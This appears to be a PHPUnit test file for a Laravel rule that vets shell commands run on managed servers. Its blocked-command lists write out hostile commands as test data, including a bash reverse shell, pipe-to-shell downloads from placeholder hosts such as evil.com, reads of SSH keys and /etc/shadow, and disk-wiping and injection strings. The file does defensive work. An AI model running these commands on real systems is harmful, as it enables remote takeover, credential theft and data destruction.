<?php

namespace Tests\Unit\Packages\Services\Sites\Command\Rules;

use App\Packages\Services\Sites\Command\Rules\SafeCommand;
use Tests\TestCase;

class SafeCommandTest extends TestCase
{
    /**
     * Test safe commands pass validation.
     */
    public function test_safe_commands_pass_validation(): void
    {
        // Arrange
        $rule = new SafeCommand;
        $safeCommands = [
            'php artisan migrate',
            'composer install',
            'npm run build',
            'php artisan cache:clear',
            'php artisan queue:work',
            'git pull origin main',
            'yarn install',
            'php artisan config:cache',
            'ls -la /home/brokeforge',
            'cd /home/brokeforge/app',
        ];

        foreach ($safeCommands as $command) {
            $failCalled = false;
            $fail = function () use (&$failCalled) {
                $failCalled = true;
            };

            // Act
            $rule->validate('command', $command, $fail);

            // Assert
            $this->assertFalse($failCalled, "Command '{$command}' should be safe but was blocked");
        }
    }

    /**
     * Test dangerous rm -rf / commands are blocked.
     */
    public function test_dangerous_rm_rf_commands_are_blocked(): void
    {
        // Arrange
        $rule = new SafeCommand;
        $dangerousCommands = [
            'rm -rf /',
            'rm -rf /var',
            'rm -rf /etc',
            'rm -rf /usr',
        ];

        foreach ($dangerousCommands as $command) {
            $failCalled = false;
            $failMessage = '';
            $fail = function ($message) use (&$failCalled, &$failMessage) {
                $failCalled = true;
                $failMessage = $message;
            };

            // Act
            $rule->validate('command', $command, $fail);

            // Assert
            $this->assertTrue($failCalled, "Dangerous command '{$command}' should be blocked");
            $this->assertStringContainsString('dangerous', $failMessage);
        }
    }

    /**
     * Test rm -rf /home/brokeforge is allowed.
     */
    public function test_rm_rf_brokeforge_home_is_allowed(): void
    {
        // Arrange
        $rule = new SafeCommand;
        $failCalled = false;
        $fail = function () use (&$failCalled) {
            $failCalled = true;
        };

        // Act
        $rule->validate('command', 'rm -rf /home/brokeforge/temp', $fail);

        // Assert
        $this->assertFalse($failCalled, 'Deleting within brokeforge home should be allowed');
    }

    /**
     * Test filesystem operations are blocked.
     */
    public function test_filesystem_operations_are_blocked(): void
    {
        // Arrange
        $rule = new SafeCommand;
        $dangerousCommands = [
            'mkfs /dev/sda',
            'fdisk /dev/sda',
            'parted /dev/sda',
            'dd if=/dev/zero of=/dev/sda',
        ];

        foreach ($dangerousCommands as $command) {
            $failCalled = false;
            $fail = function () use (&$failCalled) {
                $failCalled = true;
            };

            // Act
            $rule->validate('command', $command, $fail);

            // Assert
            $this->assertTrue($failCalled, "Filesystem operation '{$command}' should be blocked");
        }
    }

    /**
     * Test system power operations are blocked.
     */
    public function test_system_power_operations_are_blocked(): void
    {
        // Arrange
        $rule = new SafeCommand;
        $dangerousCommands = [
            'reboot',
            'shutdown now',
            'poweroff',
            'halt',
        ];

        foreach ($dangerousCommands as $command) {
            $failCalled = false;
            $fail = function () use (&$failCalled) {
                $failCalled = true;
            };

            // Act
            $rule->validate('command', $command, $fail);

            // Assert
            $this->assertTrue($failCalled, "Power operation '{$command}' should be blocked");
        }
    }

    /**
     * Test network attack tools are blocked.
     */
    public function test_network_attack_tools_are_blocked(): void
    {
        // Arrange
        $rule = new SafeCommand;
        $dangerousCommands = [
            'nmap -sS 192.168.1.1',
            'masscan 10.0.0.0/8',
            'hping 192.168.1.1',
            'tcpdump -i eth0',
            'nc -l 4444',
            'netcat -l 8080',
        ];

        foreach ($dangerousCommands as $command) {
            $failCalled = false;
            $fail = function () use (&$failCalled) {
                $failCalled = true;
            };

            // Act
            $rule->validate('command', $command, $fail);

            // Assert
            $this->assertTrue($failCalled, "Network attack tool '{$command}' should be blocked");
        }
    }

    /**
     * Test reverse shell attempts are blocked.
     */
    public function test_reverse_shell_attempts_are_blocked(): void
    {
        // Arrange
        $rule = new SafeCommand;
        $dangerousCommands = [
            'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1',
            'sh -c /dev/tcp/192.168.1.1/4444',
            'python -c /dev/tcp/evil.com/1234',
            '/dev/tcp/192.168.1.1/4444',
        ];

        foreach ($dangerousCommands as $command) {
            $failCalled = false;
            $fail = function () use (&$failCalled) {
                $failCalled = true;
            };

            // Act
            $rule->validate('command', $command, $fail);

            // Assert
            $this->assertTrue($failCalled, "Reverse shell '{$command}' should be blocked");
        }
    }

    /**
     * Test credential theft attempts are blocked.
     */
    public function test_credential_theft_attempts_are_blocked(): void
    {
        // Arrange
        $rule = new SafeCommand;
        $dangerousCommands = [
            'cat /home/user/.ssh/id_rsa',
            'grep password /etc/shadow',
            'find /.aws',
            'cat /etc/passwd',
            'locate /.kube',
        ];

        foreach ($dangerousCommands as $command) {
            $failCalled = false;
            $fail = function () use (&$failCalled) {
                $failCalled = true;
            };

            // Act
            $rule->validate('command', $command, $fail);

            // Assert
            $this->assertTrue($failCalled, "Credential theft '{$command}' should be blocked");
        }
    }

    /**
     * Test download and execute patterns are blocked.
     */
    public function test_download_and_execute_patterns_are_blocked(): void
    {
        // Arrange
        $rule = new SafeCommand;
        $dangerousCommands = [
            'curl http://evil.com/script.sh | bash',
            'wget http://malicious.com/payload | sh',
            'curl -s https://attack.com/malware.py | python',
        ];

        foreach ($dangerousCommands as $command) {
            $failCalled = false;
            $fail = function () use (&$failCalled) {
                $failCalled = true;
            };

            // Act
            $rule->validate('command', $command, $fail);

            // Assert
            $this->assertTrue($failCalled, "Download-execute '{$command}' should be blocked");
        }
    }

    /**
     * Test kernel module manipulation is blocked.
     */
    public function test_kernel_module_manipulation_is_blocked(): void
    {
        // Arrange
        $rule = new SafeCommand;
        $dangerousCommands = [
            'insmod malicious.ko',
            'rmmod some_module',
            'modprobe evil',
            'sysctl -w kernel.parameter=1',
        ];

        foreach ($dangerousCommands as $command) {
            $failCalled = false;
            $fail = function () use (&$failCalled) {
                $failCalled = true;
            };

            // Act
            $rule->validate('command', $command, $fail);

            // Assert
            $this->assertTrue($failCalled, "Kernel manipulation '{$command}' should be blocked");
        }
    }

    /**
     * Test crontab manipulation is blocked.
     */
    public function test_crontab_manipulation_is_blocked(): void
    {
        // Arrange
        $rule = new SafeCommand;
        $failCalled = false;
        $fail = function () use (&$failCalled) {
            $failCalled = true;
        };

        // Act
        $rule->validate('command', 'crontab -e', $fail);

        // Assert
        $this->assertTrue($failCalled, 'Crontab manipulation should be blocked');
    }

    /**
     * Test service manipulation of critical services is blocked.
     */
    public function test_service_manipulation_of_critical_services_is_blocked(): void
    {
        // Arrange
        $rule = new SafeCommand;
        $dangerousCommands = [
            'systemctl stop nginx',
            'systemctl disable mysql',
            'systemctl mask postgresql',
            'systemctl stop php',
        ];

        foreach ($dangerousCommands as $command) {
            $failCalled = false;
            $fail = function () use (&$failCalled) {
                $failCalled = true;
            };

            // Act
            $rule->validate('command', $command, $fail);

            // Assert
            $this->assertTrue($failCalled, "Service manipulation '{$command}' should be blocked");
        }
    }

    /**
     * Test command injection attempts are blocked.
     */
    public function test_command_injection_attempts_are_blocked(): void
    {
        // Arrange
        $rule = new SafeCommand;
        $dangerousCommands = [
            'ls; rm -rf /',
            'echo test && cat /etc/passwd',
            'php artisan migrate | tee /tmp/output',
            'echo `whoami`',
            'test $(cat /etc/shadow)',
            'echo ${PATH}',
        ];

        foreach ($dangerousCommands as $command) {
            $failCalled = false;
            $fail = function () use (&$failCalled) {
                $failCalled = true;
            };

            // Act
            $rule->validate('command', $command, $fail);

            // Assert
            $this->assertTrue($failCalled, "Command injection '{$command}' should be blocked");
        }
    }

    /**
     * Test commands exceeding maximum length are blocked.
     */
    public function test_commands_exceeding_max_length_are_blocked(): void
    {
        // Arrange
        $rule = new SafeCommand;
        $longCommand = str_repeat('a', 1001);
        $failCalled = false;
        $failMessage = '';
        $fail = function ($message) use (&$failCalled, &$failMessage) {
            $failCalled = true;
            $failMessage = $message;
        };

        // Act
        $rule->validate('command', $longCommand, $fail);

        // Assert
        $this->assertTrue($failCalled);
        $this->assertStringContainsString('maximum length', $failMessage);
    }

    /**
     * Test null byte injection is blocked.
     */
    public function test_null_byte_injection_is_blocked(): void
    {
        // Arrange
        $rule = new SafeCommand;
        $command = "ls\x00test";
        $failCalled = false;
        $failMessage = '';
        $fail = function ($message) use (&$failCalled, &$failMessage) {
            $failCalled = true;
            $failMessage = $message;
        };

        // Act
        $rule->validate('command', $command, $fail);

        // Assert
        $this->assertTrue($failCalled);
        $this->assertStringContainsString('invalid characters', $failMessage);
    }

    /**
     * Test sudo usage is blocked.
     */
    public function test_sudo_usage_is_blocked(): void
    {
        // Arrange
        $rule = new SafeCommand;
        $commands = [
            'sudo apt-get update',
            'SUDO rm -rf /tmp',
            'Sudo ls',
        ];

        foreach ($commands as $command) {
            $failCalled = false;
            $failMessage = '';
            $fail = function ($message) use (&$failCalled, &$failMessage) {
                $failCalled = true;
                $failMessage = $message;
            };

            // Act
            $rule->validate('command', $command, $fail);

            // Assert
            $this->assertTrue($failCalled, "Sudo command '{$command}' should be blocked");
            // Just verify it was blocked, the message may vary
        }
    }

    /**
     * Test non-string values are rejected.
     */
    public function test_non_string_values_are_rejected(): void
    {
        // Arrange
        $rule = new SafeCommand;
        $invalidValues = [
            123,
            ['command'],
            null,
            true,
        ];

        foreach ($invalidValues as $value) {
            $failCalled = false;
            $failMessage = '';
            $fail = function ($message) use (&$failCalled, &$failMessage) {
                $failCalled = true;
                $failMessage = $message;
            };

            // Act
            $rule->validate('command', $value, $fail);

            // Assert
            $this->assertTrue($failCalled);
            $this->assertStringContainsString('must be a valid command string', $failMessage);
        }
    }

    /**
     * Test empty string passes validation.
     */
    public function test_empty_string_passes_validation(): void
    {
        // Arrange
        $rule = new SafeCommand;
        $failCalled = false;
        $fail = function () use (&$failCalled) {
            $failCalled = true;
        };

        // Act
        $rule->validate('command', '', $fail);

        // Assert
        $this->assertFalse($failCalled, 'Empty string should pass validation');
    }

    /**
     * Test user modification outside brokeforge scope is blocked.
     */
    public function test_user_modification_outside_brokeforge_scope_is_blocked(): void
    {
        // Arrange
        $rule = new SafeCommand;
        $dangerousCommands = [
            'userdel root',
            'usermod -a -G sudo eviluser',
            'passwd root',
            'chpasswd',
        ];

        foreach ($dangerousCommands as $command) {
            $failCalled = false;
            $fail = function () use (&$failCalled) {
                $failCalled = true;
            };

            // Act
            $rule->validate('command', $command, $fail);

            // Assert
            $this->assertTrue($failCalled, "User modification '{$command}' should be blocked");
        }
    }

    /**
     * Test maximum command length boundary.
     */
    public function test_maximum_command_length_boundary(): void
    {
        // Arrange
        $rule = new SafeCommand;

        // Test exactly at limit (should pass)
        $commandAtLimit = 'php artisan '.str_repeat('x', 1000 - 12);
        $failCalled = false;
        $fail = function () use (&$failCalled) {
            $failCalled = true;
        };

        // Act
        $rule->validate('command', $commandAtLimit, $fail);

        // Assert
        $this->assertFalse($failCalled, 'Command at exactly 1000 chars should pass');

        // Test over limit (should fail)
        $commandOverLimit = $commandAtLimit.'x';
        $failCalled = false;
        $fail = function () use (&$failCalled) {
            $failCalled = true;
        };

        // Act
        $rule->validate('command', $commandOverLimit, $fail);

        // Assert
        $this->assertTrue($failCalled, 'Command over 1000 chars should fail');
    }
}
